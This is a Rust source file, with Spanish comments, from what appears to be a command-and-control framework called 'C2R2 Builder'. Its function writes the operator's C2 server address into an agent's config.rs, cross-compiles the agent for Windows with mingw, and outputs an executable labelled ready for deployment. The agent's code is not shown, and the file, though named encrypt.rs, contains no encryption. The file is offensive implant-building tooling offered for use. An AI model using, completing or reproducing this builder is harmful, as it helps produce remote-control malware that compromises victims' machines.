// File: src/encrypt.rs
// Generador de agentes con conexión directa al servidor C2

use std::fs::File;
use std::io::Write;
use std::process::Command;

pub fn generate_agent(
    output_name: &str,
    c2_server: &str,
) -> Result<(), Box<dyn std::error::Error>> {
    println!("🔧 Generando configuración del agente...");

    // Detectar si estamos en target/release/ (igual que en main)
    let agent_path = if std::env::current_dir()?
        .to_string_lossy()
        .contains("target/release")
    {
        "../../agent"
    } else {
        "agent"
    };

    // Crear directorios si no existen
    let config_dir = format!("{}/src", agent_path);
    std::fs::create_dir_all(&config_dir)?;

    // Generar config.rs
    let config_file_path = format!("{}/src/config.rs", agent_path);
    let mut config_file = File::create(&config_file_path)?;

    writeln!(
        config_file,
        "// Generado automáticamente por C2R2 Builder v2.0"
    )?;
    writeln!(
        config_file,
        "pub const C2_SERVER: &str = \"{}\";",
        c2_server
    )?;

    println!("✅ Configuración escrita en {}", config_file_path);
    println!("🌐 Servidor C2 configurado: {}", c2_server);

    // Compilar el agente
    println!("🔨 Compilando agente para Windows...");
    
    // Verificar que el manifest existe
    if !std::path::Path::new(agent_path).exists() {
        return Err(format!("❌ No se encontró el directorio del agente: {}", agent_path).into());
    }
    
    // Convertir el path relativo a absoluto
    let agent_absolute = std::fs::canonicalize(agent_path)?;
    let manifest_path = agent_absolute.join("Cargo.toml");
    
    if !manifest_path.exists() {
        return Err(format!("❌ No se encontró Cargo.toml en: {}", manifest_path.display()).into());
    }
    
    println!("📁 Manifest path: {}", manifest_path.display());
    
    // Verificar que el target está instalado
    println!("🔍 Verificando target x86_64-pc-windows-gnu...");
    let check_target = Command::new("rustup")
        .args(&["target", "list", "--installed"])
        .output()?;
    
    let installed_targets = String::from_utf8_lossy(&check_target.stdout);
    if !installed_targets.contains("x86_64-pc-windows-gnu") {
        eprintln!("\n⚠️  El target x86_64-pc-windows-gnu NO está instalado.");
        eprintln!("📦 Instálalo con: rustup target add x86_64-pc-windows-gnu");
        return Err("Target no instalado".into());
    }
    println!("✅ Target x86_64-pc-windows-gnu instalado");
    
    // Verificar que mingw-w64 está instalado (linker necesario)
    println!("🔍 Verificando linker mingw-w64...");
    let check_linker = Command::new("which")
        .arg("x86_64-w64-mingw32-gcc")
        .output();
    
    match check_linker {
        Ok(output) if output.status.success() => {
            println!("✅ Linker x86_64-w64-mingw32-gcc encontrado");
        }
        _ => {
            eprintln!("\n⚠️  El linker x86_64-w64-mingw32-gcc NO está instalado.");
            eprintln!("📦 Instálalo con: sudo apt install mingw-w64");
            eprintln!("💡 Este linker es necesario para compilar para Windows desde Linux");
            return Err("Linker mingw-w64 no instalado".into());
        }
    }
    
    let output = Command::new("cargo")
        .args(&[
            "build",
            "--release",
            "--target",
            "x86_64-pc-windows-gnu",
            "--manifest-path",
        ])
        .arg(&manifest_path)
        .output()?;

    if !output.status.success() {
        let stderr = String::from_utf8_lossy(&output.stderr);
        let stdout = String::from_utf8_lossy(&output.stdout);
        eprintln!("STDOUT:\n{}", stdout);
        eprintln!("STDERR:\n{}", stderr);
        return Err(format!(
            "Error compilando el agente:\n{}",
            stderr
        )
        .into());
    }

    // Copiar el ejecutable
    let src_exe = format!(
        "{}/target/x86_64-pc-windows-gnu/release/agent.exe",
        agent_path
    );
    let dest_exe = format!("{}.exe", output_name);

    std::fs::copy(&src_exe, &dest_exe)?;

    println!("✅ Agente compilado: {}", dest_exe);
    println!("📦 Listo para despliegue");

    Ok(())
}
